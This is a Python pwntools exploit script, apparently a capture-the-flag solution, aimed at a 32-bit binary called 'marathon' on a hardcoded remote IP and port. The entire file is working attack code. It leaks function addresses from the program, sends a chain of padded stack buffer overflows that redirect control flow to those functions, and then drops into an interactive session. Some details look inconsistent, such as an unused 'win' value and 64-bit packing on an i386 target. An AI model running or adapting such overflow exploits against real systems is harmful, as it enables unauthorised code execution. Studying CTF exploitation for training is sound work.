#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 13.214.13.126 --port 36998 ./marathon
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./marathon')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '13.214.13.126'
port = int(args.PORT or 36998)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()
win = 0x56556288 - 0x5655626d

p ='a'*10
p += p32(0xC0DEBEEF)
io.sendlineafter(": ",p)
data = io.recvline()[:-1].split(" ")
fun_e = int(data[1],16)
data = io.recvline()[:-1].split(" ")
fun_n = int(data[1],16)
data = io.recvline()[:-1].split(" ")
fun_c = int(data[1],16)
data = io.recvline()[:-1].split(" ")
fun_l = int(data[1],16)
data = io.recvline()[:-1].split(" ")
fun_s = int(data[1],16)
win = fun_e - win
print hex(win)

p ='a'*(48+2)
p += p64(fun_e)
io.sendline(p)

p ='a'*(128+4)
p += p64(fun_l)
io.sendline(p)

p ='a'*(128+4)
p += p64(fun_n)
io.sendline(p)

p ='a'*(64+4)
p += p64(fun_s)
io.sendline(p)

p ='a'*(256+4)
p += p64(fun_c)
io.sendline(p)

io.sendline('a')
io.sendline('a')

io.interactive()

